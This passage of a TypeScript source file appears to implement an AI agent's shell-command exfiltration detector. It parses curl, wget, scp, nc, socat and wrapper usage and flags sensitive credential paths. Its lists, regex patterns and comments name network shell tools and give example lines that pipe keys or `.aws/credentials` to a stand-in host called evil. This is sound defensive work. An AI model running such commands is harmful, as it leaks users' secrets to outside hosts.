// A sender carrying file/secret data, or a sensitive path combined with network/hidden code, forces per-call consent across the whole compound command, wrappers and child scripts. Inspect bodies, headers, redirects, substitutions and pipelines; rule allows never cover this floor.
// Plain downloads, literal form values, local copies and repository pushes are negative controls; the classifier grades matches HIGH and every permission mode asks once.
import { existsSync, readdirSync, realpathSync, statSync } from "node:fs";
import { homedir } from "node:os";
import { expandShellTildePaths } from "../../shared/home-tilde.js";
import { isAbsolute, join, resolve } from "node:path";
import {
  analyzeShell,
  staticShellWord,
  type ShellCommand,
  type ShellStatement,
  type ShellWord,
} from "../../shared/shell-analysis.js";
import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";
import {
  SENSITIVE_PATH_ENTRIES,
  SENSITIVE_PATH_PATTERNS,
  caseFoldForMatch,
  foldCanonicalPathSeparators,
} from "../sensitive-paths.js";
import {
  SHELL_PREFIX_POLICY,
  arithmeticEvaluationReason,
  shellFact,
  type ParsedShellCommand,
  type ShellCommandInput,
  codeCarryingVariable,
  hiddenCodeReason,
  isNetworkProgram,
  opaqueRunnerReason,
  wrapperCommand,
  runnerCommandIndexes,
} from "./shell-prefix-policy.js";
import { SHELL_FLOOR_BUDGET_REASON, shellFloorBudgetSignals, shellFloorInputExceeded, shellFloorParserBudgetExceeded, type ShellFloorSignals } from "./shell-floor-policy.js";
import { ShellFloorContext, ShellFloorLimitError, isShellFloorLiteralData, shellFloorInspectionText, shellFloorFallbackInputExceeded } from "./shell-floor-policy.js";
import { MAX_SHELL_ANALYSIS_TOKENS } from "../../shared/shell-analysis-limits.js";

const PATH_READERS = new Set([
  "cat", "tac", "base64", "base32", "tar", "gzip", "bzip2", "xz", "zstd", "zip", "xxd", "od", "hexdump",
  "openssl", "gpg", "head", "tail", "dd", "less", "more", "strings", "cut", "sed", "awk", "jq",
]);
const SOCKET_SENDERS = new Set(["nc", "ncat", "netcat", "socat"]);
const SCRIPTED_TRANSFER = new Set(["sftp", "ftp", "lftp", "tftp"]);
const SHELLS = new Set(SHELL_PREFIX_POLICY.shells);
// Network-capable programs whose arguments routinely carry local file text that is not a request body (`git commit -m "$(cat msg)"`, `gh pr create --body "$(cat body.md)"`): only the sensitive-path rule applies to them.
export const MULTI_PURPOSE_NETWORK: ReadonlySet<string> = new Set(["git", "gh", "glab", "npm", "pnpm", "yarn", "docker", "podman", "kubectl", "gpg", "psql", "mysql", "openssl"]);
const CURL_BOOLEAN_SHORT = /^[sSfLkviIlnNqgGjJORZpaBM0-9]*$/;
const CURL_DATA_LONG = ["--data", "--data-binary", "--data-raw", "--data-urlencode", "--data-ascii", "--json"];
// `--form-string` sends its value literally (no `@` file read).
const CURL_FORM_LONG = ["--form"];
const CURL_HEADER_LONG = ["--header", "--proxy-header"];
const CURL_UPLOAD_LONG = ["--upload-file"];
const WGET_FILE_BODY = ["--post-file", "--body-file"];
const WGET_DATA_BODY = ["--post-data", "--body-data"];
const RECURSION_LIMIT = 4;

// Fallback for input the grammar cannot parse: file-sourced curl/wget bodies only.
const UNPARSED_FALLBACK = /\b(?:curl|wget)\b[^\n;&|]*\s(?:-[A-Za-z]*[dF]|--data(?:-binary|-raw|-urlencode|-ascii)?|--json|--form|-T|--upload-file|--post-file|--body-file)(?:=|\s+)?["']?[^\s"']*@/;
const UNPARSED_FILE_SOURCE = /\b(?:curl|wget)\b[^\n;&|]*\s(?:-[TK](?:\s+)?|--(?:upload-file|config|post-file|body-file)(?:=|\s+))["']?[^\s"']+/;

export const SHELL_EXFIL_VERDICT_REASON = "shell possible credential exfiltration";

function program(word: string | undefined): string | undefined {
  if (word === undefined) return undefined;
  return (word.split(/[\\/]/).pop() ?? word).replace(/\.exe$/i, "");
}

// `--flag` names one of `names`, exactly or as an unambiguous getopt-style abbreviation (wget accepts `--post-f`; at least 8 characters so `--data` style prefixes of unrelated options are not guessed).
function isLongOption(flag: string, names: readonly string[]): boolean {
  return names.some((name) => name === flag || (flag.length >= 8 && name.startsWith(flag)));
}

// Static text of a word. `~`, `$HOME` and `${HOME}` expand anywhere in the word (`@$HOME/.aws/credentials`, `@"$HOME/.ssh/id_rsa"`).
function wordText(word: ShellWord): string | undefined {
  let text = "";
  for (const part of word.parts) {
    if (part.kind === "literal" || part.kind === "pattern") text += part.value;
    else if (part.kind === "parameter" && part.name === "HOME" && part.index === undefined) text += homedir();
    else return undefined;
  }
  return text;
}

const wordSubstitutions = new WeakMap<ShellWord, ShellStatement[]>();
function substitutionBodies(word: ShellWord): ShellStatement[] {
  const cached = wordSubstitutions.get(word);
  if (cached !== undefined) return cached;
  const bodies: ShellStatement[] = [];
  for (const part of word.parts) {
    if (part.kind === "substitution") bodies.push(part.body);
    else if (part.kind === "parameter-choice") bodies.push(...substitutionBodies(part.operand));
  }
  wordSubstitutions.set(word, bodies);
  return bodies;
}

interface FeederText {
  text?: string;
  left?: FeederText;
  right?: FeederText;
}
interface CommandInventory {
  commands: ShellCommand[];
  codeCoverage: Map<string, Map<number, number>>;
}
interface CommandRange {
  inventory: CommandInventory;
  start: number;
  end: number;
  readsPath: boolean;
  staticTexts: FeederText | null | undefined;
  hidden: boolean;
  xargs: boolean;
}

function appendFeeder(left: FeederText | null, right: FeederText | null): FeederText | null {
  return left === null ? right : right === null ? left : { left, right };
}

// One source inventory owns each direct syntax child. Ancestors retain ranges
// and scalar/rope summaries instead of copying every descendant command.
function commandRange(statement: ShellStatement, ctx: Context | ScanState): CommandRange {
  const scan = "scan" in ctx ? ctx.scan : ctx;
  const cached = scan.commandRanges.get(statement);
  if (cached !== undefined) return cached;
  const inventory: CommandInventory = { commands: [], codeCoverage: new Map() };
  const index = (node: ShellStatement): CommandRange => {
    scan.context.visits.inventory += 1;
    const range: CommandRange = { inventory, start: inventory.commands.length, end: inventory.commands.length,
      readsPath: false, staticTexts: null, hidden: false, xargs: false };
    scan.commandRanges.set(node, range);
    if (node.kind === "command") {
      inventory.commands.push(node);
      range.readsPath = readsPath(node);
      const text = staticFeederText(node);
      range.staticTexts = text === undefined ? undefined : { text };
      range.hidden = needsCodeTextScan(node);
      range.xargs = isXargsCommand(node);
    } else {
      let children: readonly ShellStatement[];
      switch (node.kind) {
        case "sequence": case "pipeline": children = node.statements; break;
        case "and": case "or": children = [node.left, node.right]; break;
        case "if": children = [node.condition, node.consequent, node.alternate]; break;
        case "subshell": case "background": case "negate": case "redirected": case "function": case "for": case "while": children = [node.body]; break;
        default: children = [];
      }
      for (const child of children) {
        const summary = index(child);
        range.readsPath ||= summary.readsPath;
        range.hidden ||= summary.hidden;
        range.xargs ||= summary.xargs;
        range.staticTexts = range.staticTexts === undefined || summary.staticTexts === undefined
          ? undefined : appendFeeder(range.staticTexts, summary.staticTexts);
      }
    }
    range.end = inventory.commands.length;
    return range;
  };
  return index(statement);
}

function feederText(text: FeederText, ctx: Context): string {
  const parts: string[] = [];
  const pending = [text];
  while (pending.length > 0) {
    const part = pending.pop()!;
    ctx.scan.context.visits.feeder += 1;
    if (part.text !== undefined) parts.push(part.text);
    else { pending.push(part.right!, part.left!); }
  }
  return parts.join("\n");
}

interface Context {
  cwd: string | undefined;
  depth: number;
  // Variables assigned from a file read earlier in the same command line.
  tainted: Set<string>;
  scan: ScanState;
}

// Sink-only command views through transparent wrappers and opaque runners. A runner view is a conservative candidate, never an allow-rule boundary.
function* commandCandidates(words: readonly ShellWord[]): Generator<{ words: readonly ShellWord[]; name: string }> {

  const argv = words.map(wordText);
  const seen = new Set<string>();
  const wrapper = wrapperCommand(argv);
  for (const index of new Set([wrapper.index, ...(wrapper.candidates ?? []), ...runnerCommandIndexes(argv)])) {

    const name = program(argv[index]);
    if (!name || seen.has(name)) continue;
    seen.add(name);
    // The earliest occurrence sees every later argument for this sender. Literal code arguments are inspected separately from command views.
    if (PATH_READERS.has(name) || SHELLS.has(name) || name === "eval" || isNetworkProgram([name])) yield { words: words.slice(index), name };
  }
}

// A command that reads a named path (a pipeline feeder or substitution body). A zero-word `$(<.env)` is bash's file-read shorthand.
function readsPath(cmd: ShellCommand): boolean {

  if (cmd.words.length === 0) {
    return cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target !== undefined);
  }
  for (const { words, name } of commandCandidates(cmd.words)) {
    if (!PATH_READERS.has(name)) continue;
    if (cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target)) return true;
    if (words.slice(1).some((word) => {
      const text = wordText(word);
      return text === undefined || !text.startsWith("-");
    })) return true;
  }
  return false;
}

interface WordSources { variables: readonly string[]; readsPath: boolean }

function wordSources(word: ShellWord, ctx: Context): WordSources {
  const cached = ctx.scan.wordSources.get(word);
  if (cached !== undefined) return cached;
  const variables: string[] = [];
  let file = false;
  for (const part of word.parts) {
    if (part.kind === "parameter" || part.kind === "parameter-choice") variables.push(part.name);
    if (part.kind === "parameter-choice") {
      const operand = wordSources(part.operand, ctx);
      variables.push(...operand.variables);
      file ||= operand.readsPath;
    } else if (part.kind === "substitution") file ||= commandRange(part.body, ctx).readsPath;
  }
  const result = { variables, readsPath: file };
  ctx.scan.wordSources.set(word, result);
  return result;
}

// Syntax dependencies are summarized once; propagation reads only those facts.
function bodiesReadPath(words: readonly ShellWord[], ctx: Context): boolean {
  return words.some((word) => {
    const sources = wordSources(word, ctx);
    return sources.readsPath || sources.variables.some((name) => ctx.tainted.has(name));
  });
}

// Keep the existing eight propagation rounds and statement order. Only the
// immutable source dependencies are compiled before applying those transfers.
function collectTainted(root: ShellStatement, ctx: Context): void {
  function* nested(statement: ShellStatement): Generator<ShellCommand> {
    const range = commandRange(statement, ctx);
    for (let index = range.start; index < range.end; index += 1) {
      ctx.scan.context.visits.commands += 1;
      const cmd = range.inventory.commands[index]!;
      yield cmd;
      for (const word of [...cmd.words, ...cmd.assignments.map((assignment) => assignment.value)]) {
        for (const body of substitutionBodies(word)) yield* nested(body);
      }
    }
  }
  const commands = nested(root);
  const transfers: { targets: readonly string[]; sources: readonly WordSources[]; readsPath: boolean }[] = [];
  for (const cmd of commands) {
    for (const assignment of cmd.assignments) transfers.push({ targets: [assignment.name],
      sources: [assignment.value, ...(assignment.elements ?? [])].map((word) => wordSources(word, ctx)), readsPath: false });
    const head = cmd.words[0] ? program(wordText(cmd.words[0])) : undefined;
    if (head === "read" || head === "mapfile" || head === "readarray") {
      const targets = cmd.words.slice(1).map(wordText).filter((name): name is string => name !== undefined && /^[A-Za-z_][A-Za-z0-9_]*$/.test(name));
      transfers.push({ targets, readsPath: cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target !== undefined),
        sources: cmd.redirects.filter((redirect) => redirect.effect === "read" && redirect.data !== undefined).map((redirect) => wordSources(redirect.data!, ctx)) });
    }
  }
  for (let changed = true, guard = 0; changed && guard < 8; guard += 1) {
    changed = false;
    for (const transfer of transfers) {
      if (!transfer.readsPath && !transfer.sources.some((source) => source.readsPath || source.variables.some((name) => ctx.tainted.has(name)))) continue;
      for (const target of transfer.targets) if (!ctx.tainted.has(target)) { ctx.tainted.add(target); changed = true; }
    }
  }
}

function isRemoteTarget(text: string | undefined): boolean {
  if (text === undefined) return false;
  if (/^(?:rsync|scp|sftp):\/\//i.test(text)) return true;
  if (text.startsWith("/") || text.startsWith(".") || /^[A-Za-z]:[\\/]/.test(text)) return false;
  return /^(?:[^\s/@:]+@)?[A-Za-z0-9._-]+:/.test(text) && !/^[a-z][a-z0-9+.-]*:\/\//i.test(text);
}

function curlSignal(args: readonly ShellWord[], ctx: Context): string | null {
  for (let index = 0; index < args.length; index += 1) {
    const word = args[index]!;
    const raw = wordText(word) ?? word.source.raw;
    let flag: string | undefined;
    let valueText: string | undefined;
    let valueWord: ShellWord | undefined;
    const long = /^(--[a-z-]+)(?:=([\s\S]*))?$/.exec(raw);
    if (long) {
      flag = long[1];
      if (long[2] !== undefined) { valueText = long[2]; valueWord = word; }
      else if (args[index + 1]) { valueWord = args[index + 1]; valueText = wordText(valueWord); }
    } else if (/^-[A-Za-z]/.test(raw)) {
      const letters = raw.slice(1);
      const at = letters.search(/[dFTHK]/);
      // Only boolean flags may precede it in a cluster; after a value-taking flag (`-XPOST`, `-ofile`) the rest of the word is that flag's value.
      if (at === -1 || !CURL_BOOLEAN_SHORT.test(letters.slice(0, at))) continue;
      flag = `-${letters[at]}`;
      if (at === letters.length - 1) {
        valueWord = args[index + 1];
        valueText = valueWord ? wordText(valueWord) : undefined;
      } else {
        valueText = letters.slice(at + 1);
        valueWord = word;
      }
    }
    if (!flag) continue;
    const dataFlag = flag === "-d" || isLongOption(flag, CURL_DATA_LONG);
    const formFlag = flag === "-F" || isLongOption(flag, CURL_FORM_LONG);
    const headerFlag = flag === "-H" || isLongOption(flag, CURL_HEADER_LONG);
    const uploadFlag = flag === "-T" || isLongOption(flag, CURL_UPLOAD_LONG);
    if (uploadFlag && (valueWord || valueText)) return "curl upload of a file";
    // A config file can carry `data = @file`, `upload-file`, URLs and headers.
    if ((flag === "-K" || flag === "--config") && (valueWord || valueText)) return "curl config file";
    const fromSubstitution = valueWord !== undefined && bodiesReadPath([valueWord], ctx);
    // `--data-urlencode name@file` also reads a file.
    const urlencodeFile = flag.startsWith("--data-urlenc") && /^[^=@]*@/.test(valueText ?? "");
    if (dataFlag && (valueText?.startsWith("@") || urlencodeFile || fromSubstitution)) return "curl body from a file";
    if (formFlag && (/=[@<]/.test(valueText ?? "") || fromSubstitution)) return "curl form field from a file";
    if (headerFlag && valueText?.startsWith("@")) return "curl header from a file";
  }
  return null;
}

function wgetSignal(args: readonly ShellWord[], ctx: Context): string | null {
  for (let index = 0; index < args.length; index += 1) {
    const word = args[index]!;
    const raw = wordText(word) ?? word.source.raw;
    if (/^-e\s*(?:post|body)_?file\s*=|^--execute=(?:post|body)_?file\s*=/i.test(raw)) return "wget body from a file";
    if ((raw === "-e" || raw === "--execute") && /^(?:post|body)_?file\s*=/i.test(wordText(args[index + 1] ?? word) ?? "")) {
      return "wget body from a file";
    }
    const flag = raw.split("=")[0]!;
    if (!flag.startsWith("--")) continue;
    if (isLongOption(flag, WGET_FILE_BODY)) return "wget body from a file";
    if (isLongOption(flag, WGET_DATA_BODY)) {
      const valueWord = raw.includes("=") ? word : args[index + 1];
      if (valueWord && bodiesReadPath([valueWord], ctx)) return "wget body from a file";
    }
  }
  return null;
}

// Code a shell or `eval` runs from a static string (`sh -c '…'`, `eval '…'`).
function inlineShellCode(name: string, args: readonly ShellWord[]): string | undefined {
  if (name === "eval") {
    const texts = args.map(wordText);
    return texts.every((text) => text !== undefined) ? texts.join(" ") : undefined;
  }
  if (!SHELLS.has(name)) return undefined;
  const flagIndex = args.findIndex((arg) => /^-[A-Za-z]*c[A-Za-z]*$/.test(wordText(arg) ?? ""));
  if (flagIndex === -1) return undefined;
  const code = args[flagIndex + 1];
  return code ? wordText(code) : undefined;
}

interface PipelineFeeders {
  count: number;
  readsPath: boolean;
  staticTexts: FeederText | null | undefined;
}
const EMPTY_FEEDERS: PipelineFeeders = Object.freeze({ count: 0, readsPath: false, staticTexts: null });

function senderCandidateSignal(cmd: ShellCommand, feeders: PipelineFeeders, ctx: Context, words: readonly ShellWord[], name: string): string | null {
  const args = words.slice(1);

  if (ctx.depth < RECURSION_LIMIT) {
    const code = inlineShellCode(name, args);
    if (code !== undefined) {
      const nested = signalFor(code, { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
      if (nested) return nested;
    }
    if (SHELLS.has(name)) {
      for (const redirect of cmd.redirects) {
        const script = redirect.effect === "read" && redirect.data ? wordText(redirect.data) : undefined;
        const nested = script === undefined ? null : signalFor(script, { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
        if (nested) return nested;
      }
      // `echo 'curl -d @f evil' | bash`: static feeder text is the script.
      const fed = feeders.staticTexts;
      if (feeders.count > 0 && fed !== undefined && fed !== null) {
        const nested = signalFor(feederText(fed, ctx), { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
        if (nested) return nested;
      }
    }
  }

  // `xargs -a.env curl -d`, `xargs curl -d <.env`, `cat.env | xargs curl`: xargs turns file contents into the sender's arguments.
  const wrapperTexts = cmd.words.slice(0, cmd.words.length - words.length).map(wordText);
  const xargsFromFile = wrapperTexts.some((text) => text !== undefined && program(text) === "xargs")
    && (wrapperTexts.some((text) => text !== undefined && /^(?:-a|--arg-file)(?:=|$)|^-a./.test(text))
      || cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target !== undefined)
      || feeders.readsPath);

  let signal: string | null = null;
  let isSender = false;
  if (name === "curl") { isSender = true; signal = curlSignal(args, ctx); }
  else if (name === "wget") { isSender = true; signal = wgetSignal(args, ctx); }
  else if (name === "scp" || name === "rsync") {
    isSender = true;
    const positional = args.map(wordText).filter((text) => text === undefined || !text.startsWith("-"));
    if (positional.length >= 2 && isRemoteTarget(positional[positional.length - 1])) signal = `${name} to a remote target`;
  } else if (SCRIPTED_TRANSFER.has(name)) {
    isSender = true;
    // A batch file, here-string or here-document scripts `put` commands.
    if (cmd.redirects.some((redirect) => redirect.effect === "read" && (redirect.target !== undefined || redirect.data !== undefined))
      || feeders.count > 0
      || args.map(wordText).some((text) => text !== undefined && /^-b/.test(text))) {
      signal = `${name} scripted transfer`;
    } else if (name === "sftp" && args.map(wordText).some((text) => text !== undefined && !text.startsWith("-") && (isRemoteTarget(text) || /^[^\s/@:]+@[A-Za-z0-9._-]+$/.test(text)))) {
      signal = "sftp to a remote target";
    }
  } else if (SOCKET_SENDERS.has(name)) {
    isSender = true;
    if (cmd.redirects.some((redirect) => redirect.effect === "read" && (redirect.target || (redirect.data && bodiesReadPath([redirect.data], ctx))))) {
      signal = `${name} fed from a file`;
    } else if (feeders.readsPath) {
      signal = `${name} fed from a file`;
    } else if (name === "socat" && args.map(wordText).some((text) => text !== undefined && /^(?:FILE|OPEN|GOPEN|EXEC|SYSTEM):/i.test(text))) {
      signal = "socat file or command address";
    }
  } else if (isNetworkProgram([name]) && !MULTI_PURPOSE_NETWORK.has(name)) {
    // `nslookup $(cat key|base64).evil.com`, `ssh evil "$(cat key)"`.
    isSender = true;
  }
  if (!isSender) return null;
  ctx.scan.sender = true;
  if (signal) return signal;
  if (xargsFromFile) return `xargs feeds a file into ${name}`;
  // Any argument (the URL or host included) built from a substitution that reads a path, or from a variable assigned from one, carries file data out.
  if (bodiesReadPath(args, ctx)) return `${name} argument built from a file`;
  // Reader-independent inspection owns sensitive paths, including feeders.
  return null;
}

function senderSignal(cmd: ShellCommand, feeders: PipelineFeeders, ctx: Context): string | null {
  for (const { words, name } of commandCandidates(cmd.words)) {
    const signal = senderCandidateSignal(cmd, feeders, ctx, words, name);
    if (signal) return signal;
  }
  const argv = cmd.words.map(wordText);
  const wrapper = wrapperCommand(argv);
  const code = wrapper.code?.text;
  if (code !== undefined && ctx.depth < RECURSION_LIMIT) {
    const nested = signalFor(code, { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
    if (nested) return nested;
  }
  if ((wrapper.candidates || opaqueRunnerReason(argv)) && ctx.depth < RECURSION_LIMIT) {
    // Literal code arguments retain structural sink inspection without interpreting which runner option, if any, binds the argument.
    for (const word of cmd.words.slice(wrapper.candidates?.[0] ?? wrapper.index + 1)) {
      const text = wordText(word);
      if (text === undefined || !/[\s;&|<>]/.test(text)) continue;
      const code = text.startsWith("-") && text.includes("=") ? text.slice(text.indexOf("=") + 1) : text;
      const nested = signalFor(code, { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
      if (nested) return nested;
    }
  }
  return null;
}

function walk(statement: ShellStatement, ctx: Context, feeders: PipelineFeeders = EMPTY_FEEDERS): string | null {
  ctx.scan.context.visits.walk += 1;

  switch (statement.kind) {
    case "command": {
      const own = statement.words.length > 0 ? senderSignal(statement, feeders, ctx) : null;
      if (own) return own;
      const words = [
        ...statement.words,
        ...statement.assignments.flatMap((assignment) => [assignment.value, ...(assignment.elements ?? [])]),
        ...statement.redirects.flatMap((redirect) => [redirect.target, redirect.data].filter((word): word is ShellWord => word !== undefined)),
      ];
      for (const body of words.flatMap(substitutionBodies)) {
        const nested = walk(body, ctx);
        if (nested) return nested;
      }
      return null;
    }
    case "pipeline": {
      const upstream: PipelineFeeders = { count: 0, readsPath: false, staticTexts: null };
      for (const stage of statement.statements) {
        const nested = walk(stage, ctx, upstream);
        if (nested) return nested;
        const summary = commandRange(stage, ctx);
        ctx.scan.context.visits.feeder += 1;
        upstream.count += summary.end - summary.start;
        upstream.readsPath ||= summary.readsPath;
        upstream.staticTexts = upstream.staticTexts === undefined || summary.staticTexts === undefined
          ? undefined : appendFeeder(upstream.staticTexts, summary.staticTexts);
      }
      return null;
    }
    case "sequence":
      for (const child of statement.statements) {
        const nested = walk(child, ctx);
        if (nested) return nested;
      }
      return null;
    case "and": case "or":
      return walk(statement.left, ctx) ?? walk(statement.right, ctx);
    case "subshell": case "background": case "negate": case "redirected": case "function":
      return walk(statement.body, ctx);
    case "for": case "while":
      return walk(statement.body, ctx) ?? (statement.kind === "while" ? walk(statement.condition, ctx) : null);
    case "if":
      return walk(statement.condition, ctx) ?? walk(statement.consequent, ctx) ?? walk(statement.alternate, ctx);
    default:
      return null;
  }
}

// Reader-independent sensitive-path scan A sensitive path anywhere in the command line — any word, assignment, redirection, `$`/backtick/process-substitution body, loop list, or the static text of hidden code — is found here no matter which program reads it. `~`, `~user`, `$HOME`, `${HOME}` normalize to a home directory; other expansions (`$(echo ~)`, `$X`) become an opaque segment so a literal tail (`$(echo ~)/.aws/credentials`) still matches the anchor-free sensitive patterns; brace expansion is expanded and a glob is instantiated against the sensitive names it could reach.

// Opaque stand-in for a runtime expansion inside a path.
const DYNAMIC_SEGMENT = "__ave_dynamic__";
const GLOB_INSTANCE_LIMIT = 256;
const BRACE_EXPANSION_LIMIT = 64;
// Network transports that are paths, not programs (`> /dev/tcp/host/port`).
const NETWORK_DEVICE = /\/dev\/(?:tcp|udp)\//;
// Fallback for unparseable input: a network program name as a word.
const NETWORK_WORD = /(?:^|[\s;&|(`$])(?:curl|wget|ssh|scp|sftp|rsync|openssl|nc|ncat|netcat|socat|telnet|nslookup|dig|host|gh|aws|gcloud|az|http|https|ftp)(?=\s|$)/;
const NON_FILE_URL = /^(?!file:)[a-z][a-z0-9+.-]*:\/\//i;

let sensitiveNameCache: readonly string[] | undefined;
// Every literal path segment of the sensitive-path table (`.ssh`, `.aws`, `id_rsa`, `.env`, …).
function sensitiveNames(): readonly string[] {
  sensitiveNameCache ??= [...new Set([
    ...SENSITIVE_PATH_ENTRIES.flatMap((entry) => entry.segments),
    ...SENSITIVE_PATH_PATTERNS.flatMap((pattern) => pattern.split("/"))
      .filter((segment) => segment.length > 0 && segment !== "**" && segment !== "*")
      .map((segment) => segment.replace(/\*/g, "x")),
  ])];
  return sensitiveNameCache;
}

// Glob text marks a literal `*`/`?`/`[` with a private-use escape (never a backslash, which is a separator on Windows).
const GLOB_ESCAPE = "\uE000";

function escapeGlob(text: string): string {
  return text.replace(/[*?[\uE000]/g, `${GLOB_ESCAPE}$&`);
}

function unescapeGlob(text: string): string {
  return text.replace(/\uE000(.)/gu, "$1");
}

function hasWildcard(segment: string): boolean {
  return segment.replace(/\uE000./gu, "").search(/[*?[]/) !== -1;
}

function segmentMatcher(segment: string): { test: (name: string) => boolean } {
  const tokens: (string | RegExp | null)[] = [];
  for (let index = 0; index < segment.length; index += 1) {
    const char = segment[index]!;
    if (char === GLOB_ESCAPE && index + 1 < segment.length) tokens.push(segment[++index]!);
    else if (char === "*") { if (tokens[tokens.length - 1] !== null) tokens.push(null); }
    else if (char === "?") tokens.push(/^.$/);
    else if (char === "[") {
      const close = segment.indexOf("]", index + 2);
      if (close === -1) tokens.push("[");
      else {
        try { tokens.push(new RegExp(`^[${segment.slice(index + 1, close).replace(/^!/, "^").replace(/[\\\]]/g, "\\$&")}]$`)); }
        catch { return { test: () => true }; }
        index = close;
      }
    } else tokens.push(char);
  }
  const required = tokens.filter((token) => token !== null).length;
  return { test(name) {
    if (required > name.length) return false;
    let previous = new Uint8Array(tokens.length + 1);
    previous[0] = 1;
    for (let index = 0; index < tokens.length && tokens[index] === null; index += 1) previous[index + 1] = 1;
    for (const char of name) {
      const next = new Uint8Array(tokens.length + 1);
      for (let index = 0; index < tokens.length; index += 1) {
        const token = tokens[index]!;
        next[index + 1] = token === null ? (next[index]! || previous[index + 1]!)
          : previous[index] && (typeof token === "string" ? token === char : token.test(char)) ? 1 : 0;
      }
      previous = next;
    }
    return previous[tokens.length] === 1;
  } };
}

interface CodeToken { start: number; end: number; text: string; selected: boolean }
interface CodeIndex {
  brace: CodeToken[];
  words: CodeToken[];
  coverage: Map<string, Map<number, number>>;
  partials: Map<string, CodeToken>;
  partialCoverage: Map<string, Set<string>>;
  bounds: Map<number, { braceStart: number; braceEnd: number; wordStart: number; wordEnd: number }>;
}
interface WordCodeRange { index: CodeIndex; start: number; end: number }

function codePathContext(state: ScanState): string {
  return JSON.stringify([state.cwds, state.cwdUnknown, state.metadataListing, state.dotglob,
    state.ordinaryAsk !== undefined, state.sensitive]);
}

// A raw enclosing word and its nested words share one token index. Ancestor
// path contexts still inspect the original raw tokens before any child cd.
function wordCodeRange(word: ShellWord, state: ScanState): WordCodeRange {
  const cached = state.codeRanges.get(word);
  if (cached !== undefined) return cached;
  const words: ShellWord[] = [];
  const data: { start: number; end: number }[] = [];
  const visit = (value: unknown): void => {
    if (value === null || typeof value !== "object") return;
    state.context.visits.codeNodes += 1;
    if ("parts" in value && "source" in value && Array.isArray(value.parts)) {
      const child = value as ShellWord;
      if (isShellFloorLiteralData(child)) { data.push(child.source); return; }
      words.push(child);
      state.context.visits.codeWordLinks += 1;
    }
    for (const [key, child] of Object.entries(value)) {
      if (key === "source") continue;
      if (Array.isArray(child)) for (const item of child) visit(item);
      else if (child !== null && typeof child === "object") visit(child);
    }
  };
  visit(word);
  const index: CodeIndex = { brace: [], words: [], coverage: new Map(), partials: new Map(), partialCoverage: new Map(), bounds: new Map() };
  const names = new Set(sensitiveNames());
  const segments: { start: number; end: number }[] = [];
  const append = (start: number, end: number): void => {
    segments.push({ start, end });
    const text = word.source.raw.slice(start - word.source.start, end - word.source.start);
    state.context.visits.codeSourceChars += 2 * text.length;
    for (const match of text.matchAll(/[^\s'"\x60;|&()<>=:+]+/g)) {
      index.brace.push({ start: start + match.index, end: start + match.index + match[0].length,
        text: match[0], selected: match[0].includes("{") && match[0].includes("/") });
      state.context.visits.codeTokenFacts += 1;
    }
    for (const match of text.matchAll(/[^\s'"\x60;|&()<>,{}[\]=:+]+/g)) {
      index.words.push({ start: start + match.index, end: start + match.index + match[0].length,
        text: match[0], selected: match[0].includes("/") || /^[.~$]/.test(match[0]) || names.has(match[0]) });
      state.context.visits.codeTokenFacts += 1;
    }
  };
  const dataAt = new Map(data.map((body) => [body.start, body]));
  let end = word.source.start;
  let offset = end;
  while (offset < word.source.end) {
    const body = dataAt.get(offset);
    if (body !== undefined && body.end > offset && body.end <= word.source.end) {
      append(end, offset);
      offset = body.end;
      end = offset;
    } else { state.context.visits.codeSourceChars += 1; offset += 1; }
  }
  append(end, word.source.end);
  // Register word boundaries in a single forward source pass. Nested views
  // then obtain their token intervals with two constant-time map lookups.
  const boundaries = new Set(words.flatMap((child) => [child.source.start, child.source.end]));
  let braceStart = 0;
  let braceEnd = 0;
  let wordStart = 0;
  let wordEnd = 0;
  for (const segment of segments) for (let offset = segment.start; offset <= segment.end; offset += 1) {
    state.context.visits.codeSourceChars += 1;
    while (braceStart < index.brace.length && index.brace[braceStart]!.end <= offset) braceStart += 1;
    while (braceEnd < index.brace.length && index.brace[braceEnd]!.start < offset) braceEnd += 1;
    while (wordStart < index.words.length && index.words[wordStart]!.end <= offset) wordStart += 1;
    while (wordEnd < index.words.length && index.words[wordEnd]!.start < offset) wordEnd += 1;
    if (boundaries.has(offset)) index.bounds.set(offset, { braceStart, braceEnd, wordStart, wordEnd });
  }
  for (const child of words) if (index.bounds.has(child.source.start) && index.bounds.has(child.source.end)) {
    state.codeRanges.set(child, { index, start: child.source.start, end: child.source.end });
  }
  return state.codeRanges.get(word)!;
}

function scanWordSourceCode(word: ShellWord, state: ScanState): void {
  if (state.sensitive) return;
  const range = wordCodeRange(word, state);
  const context = codePathContext(state);
  const scan = (tokens: readonly CodeToken[], brace: boolean): void => {
    const coverageKey = `${brace ? "brace" : "word"}:${context}`;
    let covered = range.index.coverage.get(coverageKey);
    if (covered === undefined) { covered = new Map(); range.index.coverage.set(coverageKey, covered); }
    const next = (from: number): number => {
      let index = from;
      const path: number[] = [];
      while (covered!.has(index)) { state.context.visits.codeCoverage += 1; path.push(index); index = covered!.get(index)!; }
      for (const previous of path) covered!.set(previous, index);
      return index;
    };
    state.context.visits.codeRangeSteps += 2;
    const startBounds = range.index.bounds.get(range.start)!;
    const endBounds = range.index.bounds.get(range.end)!;
    let first = brace ? startBounds.braceStart : startBounds.wordStart;
    let end = brace ? endBounds.braceEnd : endBounds.wordEnd;
    const partial = (source: CodeToken): void => {
      const start = Math.max(range.start, source.start);
      const end = Math.min(range.end, source.end);
      const key = `${brace}:${start}:${end}`;
      let token = range.index.partials.get(key);
      if (token === undefined) {
        const text = source.text.slice(start - source.start, end - source.start);
        state.context.visits.codeSourceChars += 2 * text.length;
        token = { start, end, text, selected: brace ? text.includes("{") && text.includes("/")
          : text.includes("/") || /^[.~$]/.test(text) || new Set(sensitiveNames()).has(text) };
        range.index.partials.set(key, token);
        state.context.visits.codeTokenFacts += 1;
      }
      let contexts = range.index.partialCoverage.get(key);
      if (contexts === undefined) { contexts = new Set(); range.index.partialCoverage.set(key, contexts); }
      if (!contexts.has(context)) {
        state.context.visits.codeTokenUses += 1;
